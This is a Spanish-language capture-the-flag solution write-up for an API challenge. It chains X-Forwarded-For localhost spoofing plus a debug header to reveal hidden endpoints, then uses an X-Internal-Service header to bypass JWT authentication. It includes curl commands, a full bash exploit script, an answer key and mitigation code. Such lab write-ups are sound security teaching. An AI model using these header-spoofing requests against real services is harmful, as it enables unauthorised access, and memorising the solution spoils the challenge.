# Solución — api-metricstream · MetricStream Infrastructure API

**Categoría:** API  
**Dificultad:** INSANE  
**Puntos:** 500  
**Técnica:** IP spoofing via X-Forwarded-For + X-Debug para descubrir endpoint interno, luego bypass de autenticación via X-Internal-Service header

---

## Cadena de vulnerabilidades

### Vulnerabilidad 1 — IP spoofing via X-Forwarded-For

El servidor usa el header `X-Forwarded-For` para determinar si el cliente es "local" (127.0.0.1). Si la IP parece ser localhost Y el header `X-Debug: 1` está presente, el endpoint `/api/v1/openapi.json` devuelve la especificación OpenAPI completa, incluyendo endpoints internos ocultos.

El error de diseño: `X-Forwarded-For` es un header que el cliente puede falsificar libremente. El servidor debería usar `request.remote_addr` (la IP real de la conexión TCP), que no puede ser manipulada por el cliente.

### Vulnerabilidad 2 — Auth bypass via X-Internal-Service header

El middleware de autenticación comprueba si el header `X-Internal-Service: true` está presente ANTES de validar el JWT. Si ese header existe, salta toda la validación y permite el acceso directamente.

El diseño asume que Nginx eliminaría ese header del tráfico externo antes de que llegue a Flask. Sin embargo, no hay Nginx — el contenedor Flask está expuesto directamente. Cualquier cliente externo puede enviar ese header y bypassear la autenticación.

---

## Reconocimiento inicial

### Paso 1 — GET / para entender la API

```bash
curl -s http://<host>:5003/ | jq .
```

Respuesta:
```json
{
  "api": "MetricStream Infrastructure API",
  "version": "4.2.0",
  "docs": "GET /api/v1/openapi.json",
  "auth": "POST /auth/login",
  "note": "Infrastructure monitoring and metrics collection platform."
}
```

La respuesta revela que existe documentación OpenAPI en `/api/v1/openapi.json`.

---

### Paso 2 — GET /api/v1/openapi.json (sin headers especiales)

```bash
curl -s http://<host>:5003/api/v1/openapi.json | jq '.paths | keys'
```

Respuesta (solo endpoints públicos):
```json
[
  "/api/v1/admin/config",
  "/api/v1/metrics/collect",
  "/api/v1/metrics/stream",
  "/auth/login",
  "/health"
]
```

El spec no muestra nada interesante todavía. Sin embargo, el campo `security_note` es una pista importante:

```json
{
  "security_note": "Internal endpoints require X-Internal-Service header (stripped by Nginx in production)"
}
```

Esto sugiere que existen endpoints internos y que la arquitectura depende de Nginx para filtrar headers.

---

### Paso 3 — Activar modo debug con IP spoofing

Combinar `X-Forwarded-For: 127.0.0.1` con `X-Debug: 1` para que el servidor crea que la petición viene de localhost:

```bash
curl -s http://<host>:5003/api/v1/openapi.json \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Debug: 1" | jq '.paths | keys'
```

Respuesta (spec completo con endpoints internos):
```json
[
  "/api/v1/admin/config",
  "/api/v1/internal/flag",
  "/api/v1/internal/health-deep",
  "/api/v1/metrics/collect",
  "/api/v1/metrics/stream",
  "/auth/login",
  "/health"
]
```

El spec ahora incluye `/api/v1/internal/flag`. Inspeccionando ese endpoint:

```bash
curl -s http://<host>:5003/api/v1/openapi.json \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Debug: 1" | jq '.paths["/api/v1/internal/flag"]'
```

```json
{
  "get": {
    "summary": "Internal flag retrieval endpoint",
    "description": "Internal service endpoint. Requires X-Internal-Service: true header. NOT for external access.",
    "tags": ["internal"],
    "security": [{"internalService": []}]
  }
}
```

El spec documenta explícitamente que el endpoint usa `X-Internal-Service` para autenticación.

---

### Paso 4 — Bypass de autenticación y obtención de la FLAG

Enviar `X-Internal-Service: true` para bypassear la validación JWT:

```bash
curl -s http://<host>:5003/api/v1/internal/flag \
  -H "X-Internal-Service: true" | jq .
```

Respuesta:
```json
{
  "service": "metricstream",
  "flag": "HL4{...FLAG_AQUI...}",
  "internal_verification_token": "HL4{...FLAG_AQUI...}",
  "note": "This endpoint is for internal service health verification only."
}
```

---

## Exploit completo (una sola sesión)

```bash
HOST="<host>:5003"

# 1. Activar debug mode con IP spoofing y descubrir endpoint interno
echo "[*] Obteniendo spec OpenAPI completo..."
curl -s "http://$HOST/api/v1/openapi.json" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Debug: 1" | jq '.paths | keys'

# 2. Bypassear auth y obtener la flag
echo "[*] Bypasseando autenticación..."
curl -s "http://$HOST/api/v1/internal/flag" \
  -H "X-Internal-Service: true" | jq '.flag'
```

---

## Por qué es INSANE

1. **Cadena de dos pasos**: no es suficiente encontrar el bypass de auth. Primero hay que descubrir el endpoint interno, que está oculto en el spec de debug. Un jugador que pruebe directamente `/api/v1/internal/flag` sin pasar por el paso de reconocimiento debug no lo encontrará.

2. **Reconocimiento no trivial**: el spec público no revela los endpoints internos. Hay que entender el mecanismo de debug (combinación de dos headers) y que `X-Forwarded-For` puede ser falsificado.

3. **Modelo de confianza de headers**: el jugador debe comprender que `X-Forwarded-For` es un header de red que los proxies añaden, pero que no tiene protección criptográfica — cualquier cliente puede enviarlo con el valor que quiera.

4. **Arquitectura implícita**: la vulnerabilidad nace de un supuesto arquitectónico (Nginx filtra headers) que no se cumple en el despliegue real. El jugador debe inferir que la defensa documentada en el spec no existe en producción.

---

## Mitigaciones

### Para la vulnerabilidad 1 (X-Forwarded-For spoofing)

- Nunca usar `X-Forwarded-For` para decisiones de seguridad sin un proxy de confianza configurado.
- Si se usa un proxy inverso, configurarlo para reescribir (no solo añadir) el header.
- Usar `request.remote_addr` para determinar la IP real de la conexión TCP.
- Deshabilitar completamente el modo debug en producción vía variable de entorno.

```python
# MAL: el cliente controla este header
client_ip = request.headers.get("X-Forwarded-For", "").split(",")[0].strip()

# BIEN: IP real de la conexión TCP (no manipulable por el cliente)
client_ip = request.remote_addr
```

### Para la vulnerabilidad 2 (X-Internal-Service bypass)

- Nunca confiar en headers HTTP para distinguir tráfico interno de externo.
- Usar mTLS (TLS mutuo con certificados de cliente) para autenticar servicios internos.
- Si se usa un proxy inverso, verificar que está activo y filtrando los headers correctamente.
- Aislar los endpoints internos en un puerto diferente no expuesto al exterior, o en una red privada separada.
- Como mínimo, añadir autenticación criptográfica (HMAC con secreto compartido) en lugar de confiar en un header plano.

```python
# MAL: el cliente externo puede enviar este header
if request.headers.get("X-Internal-Service") == "true":
    return f(*args, **kwargs)  # bypass total

# BIEN: verificar firma HMAC o usar mTLS
import hmac, hashlib
secret = os.environ["INTERNAL_SECRET"].encode()
sig = request.headers.get("X-Internal-Signature", "")
expected = hmac.new(secret, b"internal", hashlib.sha256).hexdigest()
if not hmac.compare_digest(sig, expected):
    return jsonify({"error": "forbidden"}), 403
```
